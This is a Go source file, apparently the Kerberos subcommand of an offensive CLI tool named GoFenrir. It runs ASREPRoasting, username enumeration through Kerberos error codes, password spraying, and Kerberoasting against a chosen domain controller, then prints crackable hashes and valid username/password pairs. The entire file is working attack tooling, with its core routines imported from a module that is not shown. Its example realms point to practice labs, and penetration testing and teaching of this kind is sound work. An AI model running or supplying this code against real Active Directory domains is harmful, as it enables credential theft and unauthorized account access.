package root

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/0xbbuddha/GoFenrir/core"
	"github.com/0xbbuddha/GoFenrir/modules/krb"
	"github.com/spf13/cobra"
)

var (
	krbDC           string
	krbRealm        string
	krbUsername     string
	krbPassword     string
	krbUsersFile    string
	krbSPN          string
	krbASREPRoast   bool
	krbUserEnum     bool
	krbSpray        bool
	krbKerberoast   bool
)

var krbCmd = &cobra.Command{
	Use:   "krb",
	Short: "Kerberos attacks: ASREPRoast, user enum, password spray, Kerberoast",
	Run:   runKRB,
}

func runKRB(cmd *cobra.Command, args []string) {
	if krbDC == "" {
		core.Failure("--dc is required")
		os.Exit(1)
	}
	if krbRealm == "" {
		core.Failure("--realm is required")
		os.Exit(1)
	}

	realm := strings.ToUpper(krbRealm)

	// Collect usernames
	var usernames []string
	if krbUsersFile != "" {
		lines, err := readFileLines(krbUsersFile)
		if err != nil {
			core.Failure(fmt.Sprintf("users-file: %s", err))
			os.Exit(1)
		}
		usernames = lines
	} else if krbUsername != "" {
		usernames = []string{krbUsername}
	}

	if krbASREPRoast {
		if len(usernames) == 0 {
			core.Failure("--asreproast requires --username or --users-file")
			os.Exit(1)
		}
		out := &core.OutputBuffer{}
		roastable := 0
		for _, u := range usernames {
			result, err := krb.ASREPRoastUser(u, realm, krbDC)
			if err != nil {
				errStr := err.Error()
				if strings.Contains(errStr, "not found in realm") {
					out.TreeEntryColored(fmt.Sprintf("%-30s user not found", u), core.ColorRed, false)
				} else if strings.Contains(errStr, "requires pre-authentication") {
					out.TreeEntryColored(fmt.Sprintf("%-30s requires preauth (not vulnerable)", u), core.ColorYellow, false)
				} else {
					out.Failure(fmt.Sprintf("[KRB] %s: %s", u, errStr))
				}
				continue
			}
			hash := krb.ASREPHash(result)
			roastable++
			out.TreeEntryColored(fmt.Sprintf("%-30s %s", u, hash), core.ColorGreen, false)
		}
		out.Section(fmt.Sprintf("ASREPRoast %s [%s]", realm, krbDC), roastable)
		out.Flush()
		return
	}

	if krbUserEnum {
		if len(usernames) == 0 {
			core.Failure("--user-enum requires --username or --users-file")
			os.Exit(1)
		}
		out := &core.OutputBuffer{}
		found := 0
		for _, u := range usernames {
			res, err := krb.UserEnum(u, realm, krbDC)
			if err != nil {
				out.Failure(fmt.Sprintf("[KRB] %s: %s", u, err))
				continue
			}
			if res.Exists {
				found++
				label := fmt.Sprintf("%-30s VALID", u)
				if res.Roastable {
					label += " (ASREPRoastable)"
					out.TreeEntryColored(label, core.ColorRed, false)
				} else {
					out.TreeEntryColored(label, core.ColorGreen, false)
				}
			} else {
				out.TreeEntryColored(fmt.Sprintf("%-30s not found", u), core.ColorYellow, false)
			}
		}
		out.Section(fmt.Sprintf("User Enum %s [%s]", realm, krbDC), found)
		out.Flush()
		return
	}

	if krbSpray {
		if len(usernames) == 0 {
			core.Failure("--password-spray requires --username or --users-file")
			os.Exit(1)
		}
		if krbPassword == "" {
			core.Failure("--password-spray requires --password")
			os.Exit(1)
		}
		out := &core.OutputBuffer{}
		valid := 0
		for _, u := range usernames {
			ok, err := krb.SprayPassword(u, krbPassword, realm, krbDC)
			if err != nil {
				out.TreeEntryColored(fmt.Sprintf("%-30s %s", u, err), core.ColorYellow, false)
				continue
			}
			if ok {
				valid++
				out.TreeEntryColored(fmt.Sprintf("%-30s VALID %s / %s", u, u, krbPassword), core.ColorGreen, false)
			} else {
				out.TreeEntryColored(fmt.Sprintf("%-30s invalid", u), core.ColorRed, false)
			}
		}
		out.Section(fmt.Sprintf("Password Spray %s [%s] password=%s", realm, krbDC, krbPassword), valid)
		out.Flush()
		return
	}

	if krbKerberoast {
		if krbUsername == "" {
			core.Failure("--kerberoast requires --username")
			os.Exit(1)
		}
		if krbPassword == "" {
			core.Failure("--kerberoast requires --password")
			os.Exit(1)
		}
		if krbSPN == "" {
			core.Failure("--kerberoast requires --spn")
			os.Exit(1)
		}
		out := &core.OutputBuffer{}
		spns, err := readWordlistOrLiteral(krbSPN)
		if err != nil {
			core.Failure(fmt.Sprintf("spn: %s", err))
			os.Exit(1)
		}
		roasted := 0
		for _, spn := range spns {
			hash, err := krb.KerberoastSPN(krbUsername, krbPassword, realm, krbDC, spn)
			if err != nil {
				out.Failure(fmt.Sprintf("[KRB] Kerberoast %s: %s", spn, err))
				continue
			}
			roasted++
			out.TreeEntryColored(fmt.Sprintf("%-40s %s", spn, hash), core.ColorGreen, false)
		}
		out.Section(fmt.Sprintf("Kerberoast %s [%s]", realm, krbDC), roasted)
		out.Flush()
		return
	}

	cmd.Help()
}

func readFileLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l != "" && !strings.HasPrefix(l, "#") {
			lines = append(lines, l)
		}
	}
	return lines, sc.Err()
}

func readWordlistOrLiteral(s string) ([]string, error) {
	if info, err := os.Stat(s); err == nil && !info.IsDir() {
		return readFileLines(s)
	}
	return []string{s}, nil
}

func init() {
	krbCmd.Flags().StringVar(&krbDC, "dc", "", "Domain controller / KDC IP or hostname")
	krbCmd.Flags().StringVar(&krbRealm, "realm", "", "Kerberos realm (e.g. PIRATE.HTB)")
	krbCmd.Flags().StringVarP(&krbUsername, "username", "u", "", "Username")
	krbCmd.Flags().StringVarP(&krbPassword, "password", "p", "", "Password (for --password-spray and --kerberoast)")
	krbCmd.Flags().StringVar(&krbUsersFile, "users-file", "", "File with one username per line")
	krbCmd.Flags().StringVar(&krbSPN, "spn", "", "SPN to request (e.g. cifs/dc01.pirate.htb) or file of SPNs")
	for _, f := range []string{"dc", "realm", "username", "password", "users-file", "spn"} {
		krbCmd.Flags().SetAnnotation(f, "group", []string{"Connection"})
	}

	krbCmd.Flags().BoolVar(&krbASREPRoast, "asreproast", false, "ASREPRoast: request AS-REP for accounts without pre-auth (no creds needed)")
	krbCmd.Flags().BoolVar(&krbUserEnum, "user-enum", false, "Enumerate valid usernames via KRB5 error codes (no creds needed)")
	krbCmd.Flags().BoolVar(&krbSpray, "password-spray", false, "Spray a password against a list of usernames")
	krbCmd.Flags().BoolVar(&krbKerberoast, "kerberoast", false, "Request TGS for an SPN and output hashcat-crackable hash")
	for _, f := range []string{"asreproast", "user-enum", "password-spray", "kerberoast"} {
		krbCmd.Flags().SetAnnotation(f, "group", []string{"Kerberos"})
	}

	krbCmd.MarkFlagRequired("dc")
	krbCmd.MarkFlagRequired("realm")

	rootCmd.AddCommand(krbCmd)
}
